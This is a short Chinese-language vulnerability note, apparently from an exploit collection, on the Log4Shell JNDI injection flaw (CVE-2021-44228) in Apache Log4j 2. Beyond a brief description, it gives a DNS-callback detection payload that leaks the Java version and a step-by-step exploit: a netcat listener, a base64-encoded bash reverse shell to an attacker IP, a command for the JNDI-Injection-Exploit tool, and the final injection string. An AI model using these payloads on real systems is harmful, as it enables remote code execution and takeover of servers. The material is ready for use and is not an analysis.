# CVE-2021-44228

## 介绍
Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。

## 漏洞类型

远程代码执行


## 漏洞影响版本
Apache Log4j 2.x <= 2.14.1 <= Log4j 2.15.0-rc1

## 漏洞利用条件
无需登录
## 风险程度
高危

## POC

### payload

```shell
# <dnslog> dnslog地址
${jndi:ldap://${sys:java.version}.<dnslog>}
```
## EXP

```shell
# 第一步
# 监听端口
nc -lvp <PORT>

# 第二步
# 获取base64值
# echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64

# 第三步
# 打开
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,<base64值>}|{base64,-d}|bash" -A [IP]

# payload
${jndi:rmi://<第三步生成的地址>}
```

## 工具

[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit/releases)